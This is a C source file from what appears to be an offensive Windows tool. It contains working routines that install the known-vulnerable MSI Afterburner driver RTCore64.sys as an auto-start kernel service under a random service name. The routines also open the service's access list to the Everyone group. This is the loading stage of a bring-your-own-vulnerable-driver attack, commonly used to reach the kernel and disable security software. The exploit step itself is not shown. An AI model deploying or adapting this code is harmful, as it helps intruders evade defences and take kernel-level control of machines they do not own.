/*

--- Driver install / uninstall functions.
--- Source and credit: https://github.com/gentilkiwi/mimikatz

*/
#include <Windows.h>
#include <aclapi.h>
#include <Tchar.h>
#include <time.h>

#include "DriverOps.h"

BOOL ServiceAddEveryoneAccess(SC_HANDLE serviceHandle) {
    BOOL status = FALSE;
    DWORD dwSizeNeeded;
    PSECURITY_DESCRIPTOR oldSd, newSd;
    SECURITY_DESCRIPTOR dummySdForXP;
    SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
    
    EXPLICIT_ACCESS ForEveryoneACL = {
        SERVICE_QUERY_STATUS | SERVICE_QUERY_CONFIG | SERVICE_INTERROGATE | SERVICE_ENUMERATE_DEPENDENTS | SERVICE_PAUSE_CONTINUE | SERVICE_START | SERVICE_STOP | SERVICE_USER_DEFINED_CONTROL | READ_CONTROL,
        SET_ACCESS,
        NO_INHERITANCE,
        {NULL, NO_MULTIPLE_TRUSTEE, TRUSTEE_IS_SID, TRUSTEE_IS_WELL_KNOWN_GROUP, NULL}
    };

    if (!QueryServiceObjectSecurity(serviceHandle, DACL_SECURITY_INFORMATION, &dummySdForXP, 0, &dwSizeNeeded) && (GetLastError() == ERROR_INSUFFICIENT_BUFFER)) {
        oldSd = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, dwSizeNeeded);
        if (oldSd) {
            if (QueryServiceObjectSecurity(serviceHandle, DACL_SECURITY_INFORMATION, oldSd, dwSizeNeeded, &dwSizeNeeded)) {
                if (AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, (PSID*)&ForEveryoneACL.Trustee.ptstrName)) {
                   
                    if (BuildSecurityDescriptor(NULL, NULL, 1, &ForEveryoneACL, 0, NULL, oldSd, &dwSizeNeeded, &newSd) == ERROR_SUCCESS) {
                        status = SetServiceObjectSecurity(serviceHandle, DACL_SECURITY_INFORMATION, newSd);
                        LocalFree(newSd);
                    }
                    
                    FreeSid(ForEveryoneACL.Trustee.ptstrName);
                }
            }
            LocalFree(oldSd);
        }
    }
    return status;
}

DWORD ServiceInstall(PCTSTR serviceName, PCTSTR displayName, PCTSTR binPath, DWORD serviceType, DWORD startType, BOOL startIt) {
    SC_HANDLE hSC = NULL, hS = NULL;

    hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
    if (hSC) {
        hS = OpenService(hSC, serviceName, SERVICE_START);
        if (hS) {
            _tprintf(TEXT("[+] \'%s\' service already registered\n"), serviceName);
        }
        
        else {
            if (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST) {
                _tprintf(TEXT("[*] \'%s\' service not present\n"), serviceName);

                hS = CreateService(hSC, serviceName, displayName, READ_CONTROL | WRITE_DAC | SERVICE_START, serviceType, startType, SERVICE_ERROR_NORMAL, binPath, NULL, NULL, NULL, NULL, NULL);
                
                if (hS) {
                    _tprintf(TEXT("[+] \'%s\' service successfully registered\n"), serviceName);
                    if (ServiceAddEveryoneAccess(hS)) {
                        _tprintf(TEXT("[+] \'%s\' service ACL to everyone\n"), serviceName);
                    }
                    else {
                        _tprintf(TEXT("[!] ServiceAddEveryoneAccess"));
                    }
                }
                else {
                    PRINT_ERROR_AUTO(TEXT("CreateService"));
                }
            }
            else {
                PRINT_ERROR_AUTO(TEXT("OpenService"));
            }
        }
        
        if (hS) {
            if (startIt) {
                if (StartService(hS, 0, NULL)) {
                    _tprintf(TEXT("[+] \'%s\' service started\n"), serviceName);
                }
                else if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING) {
                    _tprintf(TEXT("[*] \'%s\' service already started\n"), serviceName);
                }
                else {
                    PRINT_ERROR_AUTO(TEXT("StartService"));
                    return GetLastError();
                }
            }
            CloseServiceHandle(hS);
        }
        CloseServiceHandle(hSC);
    }
    
    else {
        PRINT_ERROR_AUTO(TEXT("OpenSCManager(create)"));
        return GetLastError();
    }
    return 0x0;
}

BOOL ServiceGenericControl(PCTSTR serviceName, DWORD dwDesiredAccess, DWORD dwControl, LPSERVICE_STATUS ptrServiceStatus) {
    BOOL status = FALSE;
    SC_HANDLE hSC, hS;
    SERVICE_STATUS serviceStatus;

    hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT);
    if (hSC) {
        hS = OpenService(hSC, serviceName, dwDesiredAccess);
        if (hS) {
            status = ControlService(hS, dwControl, ptrServiceStatus ? ptrServiceStatus : &serviceStatus);
            CloseServiceHandle(hS);
        }
        CloseServiceHandle(hSC);
    }
    return status;
}

BOOL ServiceUninstall(PCTSTR serviceName, DWORD attemptCount) {

    // Used as a stop point for recursive calls to ServiceUninstall.
    if (attemptCount > MAX_UNINSTALL_ATTEMPTS) {
        _tprintf(TEXT("[!] Reached maximun number of attempts (%i) to uninstall the service \'%s\'\n"), MAX_UNINSTALL_ATTEMPTS, serviceName);
        return FALSE;
    }

    if (ServiceGenericControl(serviceName, SERVICE_STOP, SERVICE_CONTROL_STOP, NULL)) {
        _tprintf(TEXT("[+] \'%s\' service stopped\n"), serviceName);
    }
    else if (GetLastError() == ERROR_SERVICE_NOT_ACTIVE) {
        _tprintf(TEXT("[*] \'%s\' service not running\n"), serviceName);
    }
    else if (GetLastError() == ERROR_SERVICE_CANNOT_ACCEPT_CTRL) {
        _tprintf(TEXT("[*] \'%s\' service cannot accept control messages at this time, waiting...\n"), serviceName);
        Sleep(OP_SLEEP_TIME);
    }
    else {
        PRINT_ERROR_AUTO(TEXT("ServiceUninstall"));
        Sleep(OP_SLEEP_TIME);
        return ServiceUninstall(serviceName, attemptCount + 1);
    }

    SERVICE_STATUS status;
    BOOL deleted = FALSE;
    SC_HANDLE hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT);
    if (hSC) {
        SC_HANDLE hS = OpenService(hSC, serviceName, SERVICE_QUERY_STATUS | DELETE);
        if (hS) {
            if (QueryServiceStatus(hS, &status)) {
                if (!(status.dwCurrentState == SERVICE_STOPPED)) {
                    CloseServiceHandle(hS);
                    CloseServiceHandle(hSC);
                    Sleep(OP_SLEEP_TIME);
                    return ServiceUninstall(serviceName, attemptCount + 1);
                }
                else {
                    deleted = DeleteService(hS);
                    CloseServiceHandle(hS);
                }
            }
        }
        CloseServiceHandle(hSC);
    }
    if (!deleted) {
        Sleep(OP_SLEEP_TIME);
        return ServiceUninstall(serviceName, attemptCount + 1);
    }
    return deleted;
}


/*

--- Vulnerable Micro-Star MSI Afterburner driver install / uninstall functions.
--- The "RTCore64.sys" (SHA256: 01AA278B07B58DC46C84BD0B1B5C8E9EE4E62EA0BF7A695862444AF32E87F1FD) file must be present in the current directory if --driver is not specified.

*/

static TCHAR* randString(TCHAR* str, size_t size) {
    srand((unsigned int) time(0));

    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789";
    if (size) {
        for (size_t n = 0; n < size; n++) {
            int key = rand() % (int)(sizeof charset - 1);
            str[n] = charset[key];
        }
        str[size] = '\0';
    }
    return str;
}


TCHAR* serviceName;

TCHAR* GetServiceName(void) {
    if (!serviceName || _tcslen(serviceName) == 0) {
        serviceName = calloc(SERVICE_NAME_LENGTH, sizeof(TCHAR));
        randString(serviceName, SERVICE_NAME_LENGTH);
    }
    return serviceName;
}

void SetServiceName(TCHAR *newName, size_t szNewName) {
    if (serviceName) {
        free(serviceName);
    }
    serviceName = (TCHAR*) calloc(szNewName, sizeof(TCHAR));

    if (!serviceName) {
        _tprintf(TEXT("[!] Error while attempting to set the service name.\n"));
        return;
    }

    _tcscpy_s(serviceName, szNewName, newName);
}

BOOL InstallVulnerableDriver(TCHAR* driverPath) {
    TCHAR* svcName = GetServiceName();

    DWORD status = ServiceInstall(svcName, svcName, driverPath, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, TRUE);

    if (status == 0x00000005) {
        _tprintf(TEXT("[!] 0x00000005 - Access Denied when attempting to install the driver - Did you run as administrator?\n"));
    }

    return status == 0x0;
}

BOOL UninstallVulnerableDriver(void) {
    TCHAR* svcName = GetServiceName();

    BOOL status = ServiceUninstall(svcName, 0);
    
    if (!status) {
        PRINT_ERROR_AUTO(TEXT("ServiceUninstall"));
    }

    return status;
}